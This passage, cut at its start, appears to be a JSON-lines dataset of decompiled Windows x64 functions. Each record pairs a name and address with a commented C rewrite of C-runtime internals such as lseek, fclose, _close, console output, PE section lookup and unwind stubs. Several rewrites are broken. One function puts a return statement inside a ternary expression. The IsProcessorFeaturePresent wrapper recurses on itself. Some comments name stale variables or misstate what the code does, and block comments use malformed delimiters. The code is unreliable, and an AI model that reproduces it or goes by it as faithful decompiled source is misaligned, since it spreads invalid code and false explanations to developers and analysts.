(double)FUN_14001f4a0(dVar15, DAT_140030330, DAT_140030570); // Call function with dVar15\n                return dVar15; // Return result\n            }\n        }\n        dVar15 = (double)FUN_14001f4a0(dVar15, DAT_140030350, DAT_140030574); // Call function with dVar15\n        return dVar15; // Return result\n    }\n    if (dVar15 == 0.0) { // Check if dVar15 is zero\n        dVar15 = (double)FUN_14001f4a0(dVar15, DAT_140030330, DAT_140030570); // Call function with dVar15\n        return dVar15; // Return result\n    }\n    dVar15 = (double)FUN_14001f4a0(dVar15, DAT_140030350, DAT_140030574); // Call function with dVar15\n    return dVar15; // Return result\n}\n"}
{"Function Name": "common_lseek_nolock<__int64>", "Address": "14001f24c", "Source Code": "\\*\n__int64 __cdecl common_lseek_nolock<__int64>(int file_descriptor, __int64 offset, int move_method)\n{\n    // Retrieve the file handle from the given file descriptor\n    HANDLE file_handle = (HANDLE)_get_osfhandle(file_descriptor);\n    \n    // Check if the file handle is invalid\n    if (file_handle == (HANDLE)0xffffffffffffffff) {\n        // Set the error number to indicate an invalid file descriptor\n        *(__doserrno()) = 9;\n    } else {\n        // Declare a LARGE_INTEGER to store the new file pointer position\n        LARGE_INTEGER new_position;\n        \n        // Attempt to set the file pointer to the specified position\n        if (SetFilePointerEx(file_handle, (LARGE_INTEGER)offset, &new_position, move_method) == 0) {\n            // Map the OS error to a C runtime error\n            __acrt_errno_map_os_error(GetLastError());\n        } else if (new_position.QuadPart != -1) {\n            // Calculate the address of the byte array based on the file descriptor\n            byte *byte_array_pointer = (byte *)((&DAT_14003a480)[(longlong)file_descriptor >> 6] + 0x38 + (ulonglong)(file_descriptor & 0x3f) * 0x48);\n            // Update the byte to indicate the file is no longer in use\n            *byte_array_pointer &= 0xfd;\n            // Return the new file pointer position\n            return new_position.QuadPart;\n        }\n    }\n    // Return -1 to indicate an error occurred\n    return -1;\n}\n*\\ \n \n\n__int64 __cdecl common_lseek_nolock<__int64>(int file_descriptor,__int64 offset,int move_method)\n{\n    HANDLE file_handle = (HANDLE)_get_osfhandle(file_descriptor);\n    if (file_handle == (HANDLE)0xffffffffffffffff) {\n        *(__doserrno()) = 9;\n    } else {\n        LARGE_INTEGER new_position;\n        if (SetFilePointerEx(file_handle, (LARGE_INTEGER)offset, &new_position, move_method) == 0) {\n            __acrt_errno_map_os_error(GetLastError());\n        } else if (new_position.QuadPart != -1) {\n            byte *byte_array_pointer = (byte *)((&DAT_14003a480)[(longlong)file_descriptor >> 6] + 0x38 + (ulonglong)(file_descriptor & 0x3f) * 0x48);\n            *byte_array_pointer &= 0xfd;\n            return new_position.QuadPart;\n        }\n    }\n    return -1;\n}\n"}
{"Function Name": "common_lseek_nolock<__int64>", "Address": "14001f2e8", "Source Code": "\\*\n__int64 __cdecl common_lseek_nolock<__int64>(int file_descriptor, __int64 position, int move_method)\n{\n    // Retrieve the file handle associated with the given file descriptor (param_1)\n    HANDLE file_handle = (HANDLE)_get_osfhandle(file_descriptor);\n    \n    // Check if the file handle is invalid\n    if (file_handle == (HANDLE)0xffffffffffffffff) {\n        // Set the error number to 9 (invalid handle)\n        *__doserrno() = 9;\n    } else {\n        // Declare a LARGE_INTEGER to store the new file pointer position\n        LARGE_INTEGER new_file_pointer;\n        \n        // Attempt to set the file pointer to the specified position (param_2)\n        // using the specified move method (param_3)\n        if (SetFilePointerEx(file_handle, (LARGE_INTEGER)position, &new_file_pointer, move_method) && new_file_pointer.QuadPart != -1) {\n            // Update a specific byte in a data structure to indicate a successful seek operation\n            *(byte *)((&data_structure)[(longlong)file_descriptor >> 6] + 0x38 + (ulonglong)(file_descriptor & 0x3f) * 0x48) &= 0xfd;\n            \n            // Return the new file pointer position\n            return (__int64)new_file_pointer.QuadPart;\n        }\n        \n        // Map the last error code to a C runtime error\n        __acrt_errno_map_os_error(GetLastError());\n    }\n    \n    // Return -1 to indicate failure\n    return -1;\n}\n*\\ \n \n\n__int64 __cdecl common_lseek_nolock<__int64>(int file_descriptor, __int64 position, int move_method)\n{\n    HANDLE file_handle = (HANDLE)_get_osfhandle(file_descriptor);\n    if (file_handle == (HANDLE)0xffffffffffffffff) {\n        *__doserrno() = 9;\n    } else {\n        LARGE_INTEGER new_file_pointer;\n        if (SetFilePointerEx(file_handle, (LARGE_INTEGER)position, &new_file_pointer, move_method) && new_file_pointer.QuadPart != -1) {\n            *(byte *)((&data_structure)[(longlong)file_descriptor >> 6] + 0x38 + (ulonglong)(file_descriptor & 0x3f) * 0x48) &= 0xfd;\n            return (__int64)new_file_pointer.QuadPart;\n        }\n        __acrt_errno_map_os_error(GetLastError());\n    }\n    return -1;\n}\n"}
{"Function Name": "_fclose_nolock", "Address": "14001f2f0", "Source Code": "\nint __cdecl _fclose_nolock(FILE *filePointer) // Function to close a file without locking\n{\n    int returnValue = -1; // Initialize return value to -1 (indicating failure)\n    \n    if (filePointer == (FILE *)0x0) { // Check if the file pointer is null\n        ulong *errorPointer = __doserrno(); // Get a pointer to the DOS error number\n        *errorPointer = 0x16; // Set the error number to indicate invalid file handle\n        FUN_14000ecf8(); // Call error handling function\n    } else if ((*(uint *)((longlong)&filePointer->_base + 4) >> 0xd & 1) != 0) { // Check if the file is open\n        __acrt_stdio_flush_nolock(filePointer); // Flush any buffered data to the file\n        __acrt_stdio_free_buffer_nolock(&filePointer->_ptr); // Free the buffer associated with the file\n        if (_close(fileDescriptor(filePointer)) < 0) { // Attempt to close the file descriptor\n            returnValue = -1; // Set return value to -1 if closing fails\n        } else if (filePointer->_tmpfname != (char *)0x0) { // Check if there is a temporary filename\n            _free_base(filePointer->_tmpfname); // Free the temporary filename\n            filePointer->_tmpfname = (char *)0x0; // Set temporary filename pointer to null\n        }\n    }\n    \n    __acrt_stdio_free_stream(filePointer); // Free the file stream structure\n    return returnValue; // Return the result of the close operation\n}\n"}
{"Function Name": "fclose", "Address": "14001f374", "Source Code": "\nint __cdecl fclose(FILE *filePointer)\n{\n    ulong *dosErrorPtr; // Pointer to store the address of the DOS error number\n\n    // Check if the file pointer is null\n    if (filePointer == (FILE *)0x0) {\n        dosErrorPtr = __doserrno(); // Get the address of the DOS error number\n        *dosErrorPtr = 0x16; // Set the error number to indicate a null file pointer\n        FUN_14000ecf8(); // Call a function to handle the error (specific implementation not shown)\n    } else {\n        // Check if the file stream is not in a certain state (based on the condition)\n        if ((*(uint *)((longlong)&filePointer->_base + 4) >> 0xc & 1) == 0) {\n            FUN_140017bfc((longlong)filePointer); // Perform some cleanup or preparation on the file stream\n            int closeResult = _fclose_nolock(filePointer); // Close the file without locking\n            FUN_140017c08((longlong)filePointer); // Perform additional cleanup after closing the file\n            return closeResult; // Return the result of the file close operation\n        }\n        __acrt_stdio_free_stream(); // Free the file stream if it is in a certain state\n    }\n    return -1; // Return -1 to indicate an error occurred\n}\n"}
{"Function Name": "__acrt_LCMapStringW", "Address": "14001f3d8", "Source Code": "\nvoid __acrt_LCMapStringW(wchar_t *inputString, DWORD flags, undefined1 (*stringArray)[32], int length, LPWSTR outputString, int outputLength)\n{\n    int resultLength = length; // Initialize iVar3 with the value of param_4\n    if (0 < length) { // Check if param_4 is greater than 0\n        int calculatedLength = (int)FUN_1400121a8(stringArray, (longlong)length); // Call FUN_1400121a8 with param_3 and param_4, store result in iVar1\n        resultLength = (length <= calculatedLength) ? calculatedLength : calculatedLength + 1; // Set iVar3 to iVar1 if param_4 is less than or equal to iVar1, otherwise set it to iVar1 + 1\n    }\n    // Call __acrt_LCMapStringEx with the specified parameters\n    __acrt_LCMapStringEx(inputString, flags, (LPCWSTR)stringArray, resultLength, outputString, outputLength, 0, 0, 0);\n}\n"}
{"Function Name": "_putwch_nolock", "Address": "14001f460", "Source Code": "\nwint_t __cdecl _putwch_nolock(wchar_t wideChar) // Function to write a wide character to the console without locking\n{\n    BOOL writeResult; // Variable to store the result of the console write operation\n    wchar_t charBuffer[4] = {wideChar}; // Array to hold the wide character to be written\n    \n    // Check if console output is initialized and attempt to write the character to the console\n    if (!__dcrt_lowio_ensure_console_output_initialized() || \n        (writeResult = __dcrt_write_console(charBuffer, 1, NULL), writeResult == 0)) {\n        charBuffer[0] = L'\\xffff'; // If writing fails, set the character to an invalid value\n    }\n    \n    return charBuffer[0]; // Return the character (or invalid value) from the local array\n}\n"}
{"Function Name": "FUN_14001f4a0", "Address": "14001f4a0", "Source Code": "\nvoid FUN_14001f4a0(undefined8 first_argument, undefined8 second_argument, int third_argument)\n{\n    // Call the function FUN_14001f4c0 with the provided parameters\n    // param_1: first argument of type undefined8\n    // param_2: second argument of type undefined8\n    // param_3: third argument of type int\n    // 0x1b: a constant value passed as the fourth argument\n    // \"log10\": a string literal passed as the fifth argument\n    FUN_14001f4c0(first_argument, second_argument, third_argument, 0x1b, \"log10\");\n}\n"}
{"Function Name": "FUN_14001f4c0", "Address": "14001f4c0", "Source Code": "\nundefined4\nFUN_14001f4c0(undefined8 input_param_1, undefined8 input_param_2, int condition_param, uint count_param, undefined8 callback_param)\n{\n    // Determine the value of iVar1 based on the value of param_3\n    int result_index = (condition_param == 1) ? 2 : (condition_param == 2) ? 1 : return (int)input_param_2;\n\n    // Set uVar2 based on the value of param_3\n    uint size_value = (condition_param == 1) ? 4 : 8;\n\n    // Set uVar3 based on the value of param_3\n    uint type_value = (condition_param == 1) ? 0x22 : 0x21;\n\n    // Call the function FUN_14001d1f0 with the specified parameters\n    FUN_14001d1f0(callback_param, count_param, input_param_2, result_index, size_value, type_value, input_param_1, 0, 1);\n\n    // Return the value of param_2 as an integer\n    return (int)input_param_2;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_751a882b2c74d4b022dec766aa51a29a>,class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5>&___ptr64,class_<lambda_f6c7be5f7998530c34de24c7437d6b54>_>", "Address": "14001f558", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_751a882b2c74d4b022dec766aa51a29a>,class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5>&___ptr64,class_<lambda_f6c7be5f7998530c34de24c7437d6b54>_>\n(__crt_seh_guarded_call<int> *this,<lambda_751a882b2c74d4b022dec766aa51a29a> *param_1,\n<lambda_628dfdc04ba53c8bfc02c9951375f3f5> *param_2,\n<lambda_f6c7be5f7998530c34de24c7437d6b54> *param_3)\n{\n    // Retrieve the file handle from the second parameter\n    uint _FileHandle = **(uint **)param_2;\n    int iVar1;\n\n    // Lock the file handle for safe access\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_1);\n    \n    // Check if the file handle is valid\n    if ((*(byte *)((&DAT_14003a480)[(longlong)(int)_FileHandle >> 6] + 0x38 + (ulonglong)(_FileHandle & 0x3f) * 0x48) & 1) == 0) {\n        // Set the error number to indicate an invalid handle\n        *__doserrno() = 9;\n        iVar1 = -1; // Set return value to -1 for error\n    } else {\n        // Close the file handle without locking\n        iVar1 = _close_nolock(_FileHandle);\n    }\n    \n    // Unlock the file handle after operation\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\n    \n    // Return the result of the close operation\n    return iVar1;\n}\n*\\ \n \n\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_751a882b2c74d4b022dec766aa51a29a>,class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5>&___ptr64,class_<lambda_f6c7be5f7998530c34de24c7437d6b54>_>\n(__crt_seh_guarded_call<int> *this,<lambda_751a882b2c74d4b022dec766aa51a29a> *param_1,\n<lambda_628dfdc04ba53c8bfc02c9951375f3f5> *param_2,\n<lambda_f6c7be5f7998530c34de24c7437d6b54> *param_3)\n{\n    uint _FileHandle = **(uint **)param_2;\n    int iVar1;\n\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_1);\n    if ((*(byte *)((&DAT_14003a480)[(longlong)(int)_FileHandle >> 6] + 0x38 + (ulonglong)(_FileHandle & 0x3f) * 0x48) & 1) == 0) {\n        *__doserrno() = 9;\n        iVar1 = -1;\n    } else {\n        iVar1 = _close_nolock(_FileHandle);\n    }\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\n    return iVar1;\n}\n"}
{"Function Name": "_close", "Address": "14001f5cc", "Source Code": "\\*\nint __cdecl _close(int file_handle) // Function to close a file handle\n{\n    int return_value; // Variable to store return value\n    ulong *error_pointer; // Pointer to DOS error number\n    int *file_handle_ref[3]; // Local array to hold file handle reference\n\n    if (file_handle == -2) { // Check if the file handle is -2 (invalid handle)\n        error_pointer = __doserrno(); // Get pointer to DOS error number\n        *error_pointer = 0; // Set error number to 0 (no error)\n        error_pointer = __doserrno(); // Get pointer to DOS error number again\n        *error_pointer = 9; // Set error number to 9 (bad file descriptor)\n    } else {\n        // Check if the file handle is valid and if it is open\n        if (((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) &&\n            ((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 +\n            (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0)) {\n            file_handle_ref[0] = &file_handle; // Store reference to file handle\n            // Call a guarded function to safely close the file handle\n            return_value = __crt_seh_guarded_call<int>::\n                operator()<class_<lambda_751a882b2c74d4b022dec766aa51a29a>,class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5>&___ptr64,class_<lambda_f6c7be5f7998530c34de24c7437d6b54>_>\n                (nullptr, (class_<lambda_751a882b2c74d4b022dec766aa51a29a> *) &file_handle,\n                (class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5> *) file_handle_ref,\n                (class_<lambda_f6c7be5f7998530c34de24c7437d6b54> *) &file_handle);\n            return return_value; // Return the result of the close operation\n        }\n        error_pointer = __doserrno(); // Get pointer to DOS error number\n        *error_pointer = 0; // Set error number to 0 (no error)\n        error_pointer = __doserrno(); // Get pointer to DOS error number again\n        *error_pointer = 9; // Set error number to 9 (bad file descriptor)\n        FUN_14000ecf8(); // Call a function for additional error handling\n    }\n    return -1; // Return -1 to indicate failure to close the file handle\n}\n*\\ \n \n\nint __cdecl _close(int file_handle)\n{\n    int return_value;\n    ulong *error_pointer;\n    int *file_handle_ref[3];\n\n    if (file_handle == -2) {\n        error_pointer = __doserrno();\n        *error_pointer = 0;\n        error_pointer = __doserrno();\n        *error_pointer = 9;\n    } else {\n        if (((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) &&\n            ((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 +\n            (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0)) {\n            file_handle_ref[0] = &file_handle;\n            return_value = __crt_seh_guarded_call<int>::\n                operator()<class_<lambda_751a882b2c74d4b022dec766aa51a29a>,class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5>&___ptr64,class_<lambda_f6c7be5f7998530c34de24c7437d6b54>_>\n                (nullptr, (class_<lambda_751a882b2c74d4b022dec766aa51a29a> *) &file_handle,\n                (class_<lambda_628dfdc04ba53c8bfc02c9951375f3f5> *) file_handle_ref,\n                (class_<lambda_f6c7be5f7998530c34de24c7437d6b54> *) &file_handle);\n            return return_value;\n        }\n        error_pointer = __doserrno();\n        *error_pointer = 0;\n        error_pointer = __doserrno();\n        *error_pointer = 9;\n        FUN_14000ecf8();\n    }\n    return -1;\n}\n"}
{"Function Name": "_close_nolock", "Address": "14001f670", "Source Code": "\nint __cdecl _close_nolock(int file_handle)\n{\n    DWORD last_error_code; // Variable to store the last error code\n    int return_value;   // Variable to store the return value\n    intptr_t os_file_handle; // Variable to store the OS file handle\n    HANDLE handle_object; // Handle for the object to be closed\n\n    // Get the OS file handle corresponding to the provided file handle\n    os_file_handle = _get_osfhandle(file_handle);\n    if (os_file_handle != -1) { // Check if the file handle is valid\n        // Check if the file handle is standard output or standard error and if they are in use\n        if (((file_handle == 1) && ((*(byte *)(DAT_14003a480 + 200) & 1) != 0)) ||\n            ((file_handle == 2 && ((*(byte *)(DAT_14003a480 + 0x80) & 1) != 0)))) {\n            // Get the OS file handle for standard error\n            os_file_handle = _get_osfhandle(2);\n            // If the OS file handle for standard output matches, go to the cleanup label\n            if (_get_osfhandle(1) == os_file_handle) goto LAB_14001f68a;\n        }\n        // Cast the OS file handle to a HANDLE type\n        handle_object = (HANDLE)os_file_handle;\n        // Attempt to close the handle\n        if (CloseHandle(handle_object) == 0) {\n            // If closing the handle fails, get the last error code\n            last_error_code = GetLastError();\n            goto LAB_14001f6e8; // Go to error handling\n        }\n    }\nLAB_14001f68a:\n    last_error_code = 0; // Set error code to 0 (no error)\nLAB_14001f6e8:\n    // Free the OS file handle\n    _free_osfhnd(file_handle);\n    // Clear the status for the file handle in the data structure\n    *(undefined1 *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 + (ulonglong)(file_handle & 0x3f) * 0x48) = 0;\n    // Map the error code to a return value; return 0 on success, -1 on error\n    return_value = (last_error_code == 0) ? 0 : (__acrt_errno_map_os_error(last_error_code), -1);\n    return return_value; // Return the result\n}\n"}
{"Function Name": "__acrt_stdio_free_stream", "Address": "14001f730", "Source Code": "\nvoid __cdecl __acrt_stdio_free_stream(undefined8 *stream_structure)\n{\n    // Set the fourth element of the stream structure to an invalid value (0xffffffff)\n    *(undefined4 *)(stream_structure + 3) = 0xffffffff;\n\n    // Clear the first element of the stream structure\n    *stream_structure = 0;\n\n    // Clear the second element of the stream structure\n    stream_structure[1] = 0;\n\n    // Clear the third element of the stream structure\n    *(undefined4 *)(stream_structure + 2) = 0;\n\n    // Set the memory at offset 0x1c to zero (likely a pointer or flag)\n    *(undefined8 *)((longlong)stream_structure + 0x1c) = 0;\n\n    // Clear the sixth element of the stream structure\n    stream_structure[5] = 0;\n\n    // Acquire a lock to ensure thread safety during the following operations\n    LOCK();\n\n    // Clear the memory at offset 0x14 in the stream structure\n    *(undefined4 *)((longlong)stream_structure + 0x14) = 0;\n\n    // Release the lock after completing the operations\n    UNLOCK();\n}\n"}
{"Function Name": "__dcrt_lowio_ensure_console_output_initialized", "Address": "14001f74c", "Source Code": "\nbool __dcrt_lowio_ensure_console_output_initialized(void)\n{\n    // Check if the console output handle is uninitialized (invalid handle)\n    if (consoleOutputHandle == (HANDLE)0xfffffffffffffffe) {\n        // Attempt to create a handle for the console output\n        consoleOutputHandle = CreateFileW(L\"CONOUT$\", 0x40000000, 3, NULL, 3, 0, NULL);\n    }\n    // Return true if the console output handle is valid, false otherwise\n    return consoleOutputHandle != (HANDLE)0xffffffffffffffff;\n}\n"}
{"Function Name": "FUN_14001f7a0", "Address": "14001f7a0", "Source Code": "\nvoid checkAndCloseHandle(void)\n{\n    // Check if the handle is valid (not equal to the maximum invalid handle value)\n    if (handle < (HANDLE)0xfffffffffffffffe) {\n        // Close the handle if it is valid\n        closeHandle(handle);\n    }\n}\n"}
{"Function Name": "__dcrt_write_console", "Address": "14001f7bc", "Source Code": "\nBOOL __dcrt_write_console(void *buffer, DWORD bufferSize, LPDWORD writtenChars)\n{\n    BOOL writeResult; // Variable to store the result of WriteConsoleW\n\n    // Attempt to write to the console using WriteConsoleW\n    writeResult = WriteConsoleW(consoleHandle, buffer, bufferSize, writtenChars, (LPVOID)0x0);\n    \n    // Check if the write operation was unsuccessful\n    if (writeResult == 0) {\n        // Check if the last error indicates a specific issue (error code 6)\n        if (GetLastError() == 6) {\n            // Check if the handle is valid\n            if (consoleHandle < (HANDLE)0xfffffffffffffffe) {\n                // Close the existing console handle\n                CloseHandle(consoleHandle);\n            }\n            // Reopen the console output handle\n            consoleHandle = CreateFileW(L\"CONOUT$\", 0x40000000, 3, (LPSECURITY_ATTRIBUTES)0x0, 3, 0, (HANDLE)0x0);\n            // Attempt to write to the console again\n            writeResult = WriteConsoleW(consoleHandle, buffer, bufferSize, writtenChars, (LPVOID)0x0);\n        }\n    }\n    \n    // Return the result of the write operation\n    return writeResult;\n}\n"}
{"Function Name": "KERNEL32.DLL::IsProcessorFeaturePresent", "Address": "14001f87a", "Source Code": "\n// Function declaration for IsProcessorFeaturePresent, which checks for specific processor features.\n// The function uses the __stdcall calling convention and returns a BOOL value.\nBOOL __stdcall CheckProcessorFeature(DWORD featureId)\n{\n    // Call the IsProcessorFeaturePresent function with the provided ProcessorFeature argument.\n    // This will return TRUE if the specified feature is present, otherwise FALSE.\n    return CheckProcessorFeature(featureId);\n}\n"}
{"Function Name": "_FindPESection", "Address": "14001f880", "Source Code": "\nPIMAGE_SECTION_HEADER __cdecl _FindPESection(PBYTE imageBase, DWORD_PTR relativeVirtualAddress)\n{\n    // Retrieve the offset to the PE header from the DOS header\n    int peHeaderOffset = *(int *)(imageBase + 0x3c);\n    \n    // Calculate the pointer to the first section header\n    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(imageBase +\n        (ulonglong)*(ushort *)(imageBase + (longlong)peHeaderOffset + 0x14) + 0x18 + (longlong)peHeaderOffset);\n    \n    // Get the number of sections from the PE header\n    ushort numberOfSections = *(ushort *)(imageBase + (longlong)peHeaderOffset + 6);\n    \n    // Check if there are any sections to iterate over\n    if (numberOfSections != 0) {\n        // Loop through each section header\n        for (uint sectionIndex = 0; sectionIndex < numberOfSections; sectionIndex++, sectionHeader++) {\n            // Check if the RVA falls within the current section's range\n            if ((sectionHeader->VirtualAddress <= relativeVirtualAddress) &&\n                (relativeVirtualAddress < (sectionHeader->Misc).PhysicalAddress + sectionHeader->VirtualAddress)) {\n                // Return the pointer to the matching section header\n                return sectionHeader;\n            }\n        }\n    }\n    // Return null if no matching section is found\n    return (PIMAGE_SECTION_HEADER)0x0;\n}\n"}
{"Function Name": "_IsNonwritableInCurrentImage", "Address": "14001f8d0", "Source Code": "\nBOOL __cdecl _IsNonwritableInCurrentImage(PBYTE targetAddress)\n{\n    PIMAGE_SECTION_HEADER sectionHeader; // Pointer to the section header\n\n    // Validate the image base address\n    if (_ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_140000000) != 0) {\n        // Find the PE section corresponding to the target address\n        sectionHeader = _FindPESection((PBYTE)&IMAGE_DOS_HEADER_140000000, (DWORD_PTR)(targetAddress - 0x140000000));\n        \n        // Check if the section header was found\n        if (sectionHeader != (PIMAGE_SECTION_HEADER)0x0) {\n            // Return TRUE if the section is non-writable, FALSE otherwise\n            return (BOOL)(~(sectionHeader->Characteristics >> 0x1f) & 1);\n        }\n    }\n    \n    // Return FALSE if the image base is invalid or section header not found\n    return FALSE;\n}\n"}
{"Function Name": "_ValidateImageBase", "Address": "14001f920", "Source Code": "\nBOOL __cdecl _ValidateImageBase(PBYTE imageBase)\n{\n    // Check if the first two bytes of the image base match the 'MZ' signature (0x5a4d)\n    return ((*(short *)imageBase == 0x5a4d) &&\n            // Check if the value at the offset specified by the PE header (0x3c) matches the 'PE' signature (0x4550)\n            (*(int *)(imageBase + *(int *)(imageBase + 0x3c)) == 0x4550) &&\n            // Check if the value at the offset of the Optional Header (0x18) equals the expected magic number (0x20b)\n            ((short)*(int *)((longlong)(imageBase + *(int *)(imageBase + 0x3c)) + 0x18) == 0x20b));\n}\n"}
{"Function Name": "_guard_dispatch_icall", "Address": "14001f9e0", "Source Code": "\n// Function declaration for _guard_dispatch_icall\nvoid _guard_dispatch_icall(void)\n{\n    // Call the function pointed to by UNRECOVERED_JUMPTABLE\n    (*functionPointer)();\n}\n"}
{"Function Name": "Unwind@14001f9f0", "Address": "14001f9f0", "Source Code": "\nvoid Unwind_14001f9f0(undefined8 input_param, longlong data_pointer)\n{\n    // Call the function FUN_140006e60 with the pointer obtained from the offset 0x40 of param_2\n    FUN_140006e60(*(longlong **)(data_pointer + 0x40));\n}\n"}
{"Function Name": "Unwind@14001f9fc", "Address": "14001f9fc", "Source Code": "\nvoid Unwind_14001f9fc(undefined8 input_param, longlong address)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x70 to param_2\n    FUN_140006e60((longlong *)(address + 0x70));\n}\n"}
{"Function Name": "Unwind@14001fa10", "Address": "14001fa10", "Source Code": "\nvoid unwindFunction(void) // Function definition for Unwind_14001fa10\n{\n    thunkFunction(); // Call to thunk function thunk_FUN_14000b460\n}\n"}
{"Function Name": "Unwind@14001fa30", "Address": "14001fa30", "Source Code": "\nvoid Unwind_14001fa30(undefined8 input_param, longlong lockit_address)\n{\n    // Call the destructor for the std::_Lockit object located at the address (param_2 + 0x20)\n    std::_Lockit::~_Lockit((_Lockit *)(lockit_address + 0x20));\n}\n"}
{"Function Name": "Unwind@14001fa3c", "Address": "14001fa3c", "Source Code": "\nvoid Unwind_14001fa3c(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006dc0 with the address calculated by adding 0x28 to param_2\n    FUN_140006dc0((undefined8 *)(address_offset + 0x28));\n}\n"}
{"Function Name": "Unwind@14001fa4c", "Address": "14001fa4c", "Source Code": "\nvoid Unwind_14001fa4c(undefined8 input_param, longlong address)\n{\n    // Call the function FUN_140006dc0 with the address calculated by adding 0x38 to param_2\n    FUN_140006dc0((undefined8 *)(address + 0x38));\n}\n"}
{"Function Name": "Unwind@14001fa5c", "Address": "14001fa5c", "Source Code": "\nvoid Unwind_14001fa5c(undefined8 input_value, longlong memory_address)\n{\n    // Call the function FUN_140006dc0 with a pointer to the memory location \n    // calculated by adding 0x48 to the value of param_2.\n    FUN_140006dc0((undefined8 *)(memory_address + 0x48));\n}\n"}
{"Function Name": "Unwind@14001fa6c", "Address": "14001fa6c", "Source Code": "\nvoid Unwind_14001fa6c(undefined8 input_value, longlong memory_address)\n{\n    // Call the function FUN_140006dc0 with a pointer to the memory location\n    // calculated by adding 0x58 to the value of param_2.\n    FUN_140006dc0((undefined8 *)(memory_address + 0x58));\n}\n"}
{"Function Name": "Unwind@14001fa7c", "Address": "14001fa7c", "Source Code": "\nvoid Unwind_14001fa7c(undefined8 input_value, longlong address_value)\n{\n    // Call the function FUN_140006dc0 with the address calculated by adding 0x68 to param_2\n    FUN_140006dc0((undefined8 *)(address_value + 0x68));\n}\n"}
{"Function Name": "Unwind@14001fa8c", "Address": "14001fa8c", "Source Code": "\nvoid Unwind_14001fa8c(undefined8 input_value, longlong memory_address)\n{\n    // Call the function FUN_140006dc0 with a pointer to the memory location \n    // calculated by adding 0x78 to the value of param_2.\n    FUN_140006dc0((undefined8 *)(memory_address + 0x78));\n}\n"}
{"Function Name": "Unwind@14001faa0", "Address": "14001faa0", "Source Code": "\nvoid Unwind_14001faa0(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x30 to param_2\n    FUN_140006e60((longlong *)(address_offset + 0x30));\n}\n"}
{"Function Name": "Unwind@14001fab0", "Address": "14001fab0", "Source Code": "\nvoid Unwind_14001fab0(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006d60 with the address calculated by adding 0x30 to param_2\n    FUN_140006d60((longlong *)(address_offset + 0x30));\n}\n"}
{"Function Name": "Unwind@14001fac0", "Address": "14001fac0", "Source Code": "\nvoid Unwind_14001fac0(undefined8 input_param, longlong address_offset)\n{\n    // Call the _Tidy_deallocate method on the basic_string<wchar_t> object\n    // located at the address offset by 0x48 from param_2\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(address_offset + 0x48));\n}\n"}
{"Function Name": "Unwind@14001facc", "Address": "14001facc", "Source Code": "\nvoid Unwind_14001facc(undefined8 input_param, longlong memory_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address (param_2 + 0x28) to deallocate memory.\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(memory_address + 0x28));\n}\n"}
{"Function Name": "Unwind@14001fb00", "Address": "14001fb00", "Source Code": "\nvoid Unwind_14001fb00(undefined8 input_param, longlong memory_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the memory address calculated by adding 0x170 to param_2\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(memory_address + 0x170));\n}\n"}
{"Function Name": "Unwind@14001fb0c", "Address": "14001fb0c", "Source Code": "\nvoid Unwind_14001fb0c(undefined8 input_param, longlong object_pointer)\n{\n    // Check if the least significant bit of the value at offset 0x50 of param_2 is set\n    if (*(uint *)(object_pointer + 0x50) & 1) {\n        // Clear the least significant bit at offset 0x50 of param_2\n        *(uint *)(object_pointer + 0x50) &= 0xfffffffe;\n\n        // Deallocate memory for the string located at offset 0x128 of param_2\n        std::basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t>>::_Tidy_deallocate(\n            *(basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t> **>(object_pointer + 0x128))\n        );\n    }\n}\n"}
{"Function Name": "Unwind@14001fb40", "Address": "14001fb40", "Source Code": "\nvoid Unwind_14001fb40(undefined8 input_value, longlong memory_address)\n{\n    // Check if the least significant bit of the value at offset 0x20 from param_2 is set\n    if (*(uint *)(memory_address + 0x20) & 1) {\n        // Clear the least significant bit at offset 0x20\n        *(uint *)(memory_address + 0x20) &= 0xfffffffe;\n        \n        // Deallocate memory for the string located at offset 0x80 from param_2\n        std::basic_string<wchar_t, struct_std::char_traits<wchar_t>, class_std::allocator<wchar_t>>::Tidy_deallocate(\n            *(basic_string<wchar_t, struct_std::char_traits<wchar_t>, class_std::allocator<wchar_t> **>(memory_address + 0x80)));\n    }\n}\n"}
{"Function Name": "Unwind@14001fb70", "Address": "14001fb70", "Source Code": "\nvoid Unwind_14001fb70(undefined8 input_param, longlong memory_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the memory address (param_2 + 0x40).\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(memory_address + 0x40));\n}\n"}
